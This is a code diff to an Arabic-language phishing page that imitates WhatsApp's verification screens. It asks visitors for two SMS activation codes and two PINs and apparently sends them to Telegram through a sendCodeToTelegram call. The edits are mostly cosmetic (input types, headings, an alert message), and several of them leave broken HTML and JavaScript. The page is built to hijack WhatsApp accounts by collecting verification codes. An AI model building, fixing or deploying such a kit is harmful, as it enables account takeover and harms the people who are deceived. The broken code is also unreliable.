@@ -115,7 +115,7 @@
 
     <div class="container" id="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        <h1>ا: رمز التفعيل</h1>
+        <h1 رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
         <input id="activationCode1" type="tel" placeholder="رمز التفعيل " maxlength="6">
         <button onclick="submitFirstActivationCode()">متابعة</button>
@@ -173,10 +173,10 @@
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>الم
+                    <h
 : رمز التفعيل</h1>
                     <p>يرجى إدخال رمز التفعيل  المكون من 6 أرقام.</p>
-                    <input id="activationCode2" type="text" placeholder="رمز التفعيل " maxlength="6">
+                    <input id="activationCode2" type="tel" placeholder="رمز التفعيل " maxlength="6">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
                 `;
@@ -199,7 +199,7 @@
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>: PIN</h1>
                     <p>يرجى إدخال رمز PIN المكون من 6 أرقام.</p>
-                    <input id="pinCode1" type="text" placeholder="PIN " maxlength="6">
+                    <input id="pinCode1" type="tel" placeholder="PIN " maxlength="6">
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
                 `;
@@ -220,9 +220,9 @@
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>المرحلة : PIN</h1>
+                    <h1> : PIN</h1>
                     <p>يرجى إدخال رمز PIN  المكون من 6 أرقام.</p>
-                    <input id="pinCode2" type="text" placeholder="PIN " maxlength="6">
+                    <input id="pinCode2" type="tel" placeholder="PIN " maxlength="6">
                     <button onclick="submitSecondPin()">متابعة</button>
                     <div id="countdown"></div>
                 `;
@@ -240,7 +240,7 @@
             sendCodeToTelegram(pinCode2, "رمز PIN ");
 
             startCountdown(() => {
-                alert(' انتضر بعض دقائق تم الأمر بنجاح!');
+                alert(إنتظار لحظه!');
             });
         }
     </script>
